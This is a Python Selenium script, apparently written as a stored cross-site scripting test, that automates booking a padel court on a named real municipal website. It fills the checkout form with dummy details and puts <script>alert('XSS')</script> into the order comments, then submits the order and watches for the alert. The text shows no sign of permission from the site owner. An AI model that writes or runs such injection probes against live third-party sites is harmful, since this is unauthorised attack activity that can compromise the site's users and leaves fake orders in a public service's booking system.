from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Inicializa el navegador Chrome
driver = webdriver.Chrome()
wait = WebDriverWait(driver, 20)

print("Paso 1: Navegando a la página de reserva de pistas...")
driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")

print("Paso 2: Esperando que cargue el calendario...")
time.sleep(5)

print("Paso 3: Seleccionando una fecha disponible...")
try:
    # Busca una fecha disponible (día 9 por ejemplo)
    fecha_disponible = wait.until(EC.element_to_be_clickable((By.XPATH, "//td[contains(@class, 'day') and text()='9']")))
    fecha_disponible.click()
    time.sleep(3)
    
    print("Paso 4: Seleccionando un horario disponible...")
    # Busca un horario disponible
    horario = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='radio' and contains(@name, 'horario')]")))
    horario.click()
    time.sleep(2)
    
    print("Paso 5: Añadiendo al carrito...")
    boton_reservar = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Reservar') or contains(text(), 'reservar')]")))
    boton_reservar.click()
    time.sleep(3)
    
    print("Paso 6: Navegando a finalizar compra...")
    driver.get("https://www.horcajodesantiago.es/reserva-pistas/carrito/finalizar-compra/")
    
    print("Paso 7: Esperando formulario de datos personales...")
    wait.until(EC.presence_of_element_located((By.NAME, "billing_first_name")))
    
    print("Paso 8: Rellenando formulario con payload XSS...")
    driver.find_element(By.NAME, "billing_first_name").send_keys("Prueba")
    driver.find_element(By.NAME, "billing_last_name").send_keys("XSS")
    driver.find_element(By.NAME, "billing_phone").send_keys("123456789")
    driver.find_element(By.NAME, "billing_email").send_keys("prueba@example.com")
    driver.find_element(By.NAME, "order_comments").send_keys("<script>alert('XSS')</script>")
    
    # Marca la casilla de aceptación de términos si existe
    try:
        driver.find_element(By.NAME, "terms").click()
    except:
        pass
    
    print("Formulario rellenado. Revisa y presiona Enter para enviar...")
    input("Presiona Enter para continuar...")
    
    try:
        driver.find_element(By.ID, "place_order").click()
        print("Formulario enviado. Observa si aparece alerta XSS...")
        time.sleep(10)
    except:
        print("No se encontró el botón de envío.")
        
except Exception as e:
    print(f"Error en el proceso: {e}")
    print("Puede que necesites ajustar los selectores según la página actual.")

driver.quit()
